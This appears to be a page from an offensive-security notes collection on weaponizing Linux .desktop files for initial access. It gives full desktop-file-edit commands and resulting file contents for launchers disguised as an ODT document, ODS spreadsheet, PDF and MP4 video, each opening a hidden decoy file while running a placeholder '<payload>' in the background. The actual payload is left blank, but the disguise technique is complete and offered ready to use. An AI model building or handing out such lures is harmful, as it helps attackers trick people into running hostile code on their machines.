---
author(s):
  - Userware
tags:
  - helpers
  - initial-access
  - weaponization
  - client-side-attacks
  - linux
---
# Helpers

## Install Desktop File Utilities

Install it according to your package manager.

```
$ sudo apt install -y desktop-file-utils

$ sudo dnf install -y desktop-file-utils

$ sudo pacman -S --noconfirm desktop-file-utils
```

## Common Files Locations

### Directory Entries

```
/usr/share/desktop-directories/
~/.local/share/desktop-directories/
```

### Desktop Entries

```
/usr/share/applications/
~/.local/share/applications/
```

## LibreOffice Desktop Entry Templates

```
$ ls -l /usr/share/applications/libreoffice-*.desktop
```

### Document Desktop Entry

First create the file.

```
$ touch malicious_document.odt.desktop
```

Then insert the following keys and values.

```
$ desktop-file-edit \
--set-key="Encoding" --set-value="UTF-8" \
--set-name="document.odt" \
--set-key="Version" --set-value="1.0" \
--set-comment="A document file" \
--set-key="Path" --set-value="/tmp/" \
--set-icon="libreoffice-writer" \
--set-key="Terminal" --set-value="false" \
--set-key="Exec" --set-value="libreoffice --writer \"\$(pwd)/.real_document.odt\" | <payload> &" \
--set-key="Type" --set-value="Application" \
--set-key="NoDisplay" --set-value="true" \
--set-key="Hidden" --set-value="false" \
--remove-key="X-Desktop-File-Install-Version" \
malicious_document.odt.desktop 2&>1
```

To view the contents of the payload.

```
$ cat malicious_document.odt.desktop
[Desktop Entry]  
Encoding=UTF-8  
Name=document.odt  
Version=1.0  
Comment=A document file  
Path=/tmp/  
Icon=libreoffice-writer  
Terminal=false  
Exec=libreoffice --writer "$(pwd)/.real_document.odt" | <payload> &  
Type=Application  
NoDisplay=true  
Hidden=false
```

### Spreadsheet Desktop Entry

First create the file.

```
$ touch malicious_spreadsheet.ods.desktop
```

Then insert the following keys and values.

```
$ desktop-file-edit \
--set-key="Encoding" --set-value="UTF-8" \
--set-name="spreadsheet.ods" \
--set-key="Version" --set-value="1.0" \
--set-comment="A spreadsheet file" \
--set-key="Path" --set-value="/tmp/" \
--set-icon="libreoffice-calc" \
--set-key="Terminal" --set-value="false" \
--set-key="Exec" --set-value="libreoffice --calc \"\$(pwd)/.real_spreadsheet.ods\" | <payload> &" \
--set-key="Type" --set-value="Application" \
--set-key="NoDisplay" --set-value="true" \
--set-key="Hidden" --set-value="false" \
--remove-key="X-Desktop-File-Install-Version" \
malicious_document.ods.desktop 2&>1
```

To view the contents of the payload.

```
$ cat malicious_spreadsheet.ods.desktop
[Desktop Entry]
Encoding=UTF-8
Name=spreadsheet.ods
Version=1.0
Comment=A spreadsheet file
Path=/tmp/
Icon=libreoffice-calc
Terminal=false
Exec=libreoffice --calc "$(pwd)/.real_spreadsheet.ods" | <payload> &
Type=Application
NoDisplay=true
Hidden=false
```

## PDF Desktop Entry

First create the file.

```
$ touch malicious_document.pdf.desktop
```

Then insert the following keys and values.

```
$ desktop-file-edit \
--set-key="Encoding" --set-value="UTF-8" \
--set-name="document.pdf" \
--set-key="Version" --set-value="1.0" \
--set-comment="A readable document file" \
--set-key="Path" --set-value="/tmp/" \
--set-icon="x-office-document" \
--set-key="Terminal" --set-value="false" \
--set-key="Exec" --set-value="libreoffice \"\$(pwd)/.real_document.pdf\" | <payload> &" \
--set-key="Type" --set-value="Application" \
--set-key="NoDisplay" --set-value="true" \
--set-key="Hidden" --set-value="false" \
--remove-key="X-Desktop-File-Install-Version" \
malicious_document.pdf.desktop 2&>1
```

To view the contents of the payload.

```
$ cat malicious_document.pdf.desktop
[Desktop Entry]
Encoding=UTF-8
Name=document.pdf
Version=1.0
Comment=A readable document file
Path=/tmp/
Icon=x-office-document
Terminal=false
Exec=libreoffice "$(pwd)/.real_document.pdf" | <payload> &
Type=Application  
NoDisplay=true
Hidden=false
```

Another variant by replacing the icon value `application-pdf` which is much more universal.

```
$ desktop-file-edit \
--set-key="Encoding" --set-value="UTF-8" \
--set-name="document.pdf" \
--set-key="Version" --set-value="1.0" \
--set-comment="A readable document file" \
--set-key="Path" --set-value="/tmp/" \
--set-icon="application-pdf" \
--set-key="Terminal" --set-value="false" \
--set-key="Exec" --set-value="libreoffice \"\$(pwd)/.real_document.pdf\" | <payload> &" \
--set-key="Type" --set-value="Application" \
--set-key="NoDisplay" --set-value="true" \
--set-key="Hidden" --set-value="false" \
--remove-key="X-Desktop-File-Install-Version" \
malicious_document.pdf.desktop 2&>1

$ cat malicious_document.pdf.desktop
[Desktop Entry]
Encoding=UTF-8
Name=document.pdf
Version=1.0
Comment=A readable document file
Path=/tmp/
Icon=application-pdf
Terminal=false
Exec=libreoffice "$(pwd)/.real_document.pdf" | <payload> &
Type=Application  
NoDisplay=true
Hidden=false
```

## Video Desktop Entry

First create the file.

```
$ touch malicious_video.mp4.desktop
```

Then insert the following keys and values.

```
$ desktop-file-edit \
--set-key="Encoding" --set-value="UTF-8" \
--set-name="video.mp4" \
--set-key="Version" --set-value="1.0" \
--set-comment="A video file" \
--set-key="Path" --set-value="/tmp/" \
--set-icon="video-x-generic" \
--set-key="Terminal" --set-value="false" \
--set-key="Exec" --set-value="/usr/bin/xdg-open \"\$(pwd)/.real_video.mp4\" | <payload> &" \
--set-key="Type" --set-value="Application" \
--set-key="NoDisplay" --set-value="true" \
--set-key="Hidden" --set-value="false" \
--remove-key="X-Desktop-File-Install-Version" \
malicious_video.mp4.desktop 2&>1
```

To view the contents of the payload.

```
$ cat malicious_video.mp4.desktop
[Desktop Entry]
Encoding=UTF-8
Name=video.mp4
Version=1.0
Comment=A video file
Path=/tmp/
Icon=video-x-generic
Terminal=false
Exec=/usr/bin/xdg-open "$(pwd)/.real_video.mp4" | <payload> &
Type=Application  
NoDisplay=true
Hidden=false
```

---
## References

### FreeDesktop

- [FreeDesktop: Desktop Entry Spec - Recognized desktop entry keys](https://specifications.freedesktop.org/desktop-entry-spec/latest/recognized-keys.html)

- [FreeDesktop: Desktop Entry Spec - The `Exec` key](https://specifications.freedesktop.org/desktop-entry-spec/latest/exec-variables.html)